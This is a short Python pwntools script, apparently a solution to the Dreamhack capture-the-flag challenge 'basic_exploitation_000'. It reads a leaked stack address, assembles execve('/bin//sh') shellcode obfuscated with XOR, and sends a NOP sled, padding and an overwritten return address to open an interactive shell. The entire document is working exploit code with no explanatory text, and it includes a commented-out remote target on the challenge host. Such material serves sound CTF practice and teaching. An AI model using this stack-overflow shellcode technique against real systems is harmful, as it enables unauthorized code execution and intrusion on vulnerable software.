from pwn import *
import os
p = process("./basic_exploitation_000")
# p = remote("host1.dreamhack.games", 8261)

print `p.recvuntil("(")`
s = p.recvuntil(")").strip(")")
d = int(s,16)
print `p32(d)`
ret_addr = p32(d)


SHELLCODE = asm("push 0x1010101")
SHELLCODE += asm("xor dword ptr [esp], 0x169722e")
SHELLCODE += asm("push 0x6e69622f")
SHELLCODE += asm("mov ebx, esp")
SHELLCODE += asm("xor ecx, ecx")
SHELLCODE += asm("xor edx, edx")
SHELLCODE += asm("mov al, 0x44")
SHELLCODE += asm("xor al, 0x4F")
SHELLCODE += asm("int 0x80")
print "SHELLCODE LENGTH : %d" % len(SHELLCODE)



SHELLCODE = "\x90"*50+SHELLCODE+"B"*(132-50-len(SHELLCODE))
SHELLCODE += ret_addr


p.send(SHELLCODE)
raw_input("$")
p.interactive()


